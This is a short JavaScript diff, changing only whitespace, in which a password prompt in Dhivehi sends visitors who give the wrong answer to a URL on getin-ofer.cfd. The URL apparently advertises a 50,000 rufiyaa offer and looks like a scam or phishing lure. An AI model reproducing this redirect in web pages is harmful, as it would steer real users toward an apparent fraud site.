@@ -5,5 +5,5 @@ password = prompt(
   'ކޭޝް ނެގުން'
 );
 if (password != 'ކޭޝް ނެގުން') {
-  location.href = 'https://getin-ofer.cfd/Mvr-50000-Qasim.html';
+ location.href = 'https://getin-ofer.cfd/Mvr-50000-Qasim.html';
   }
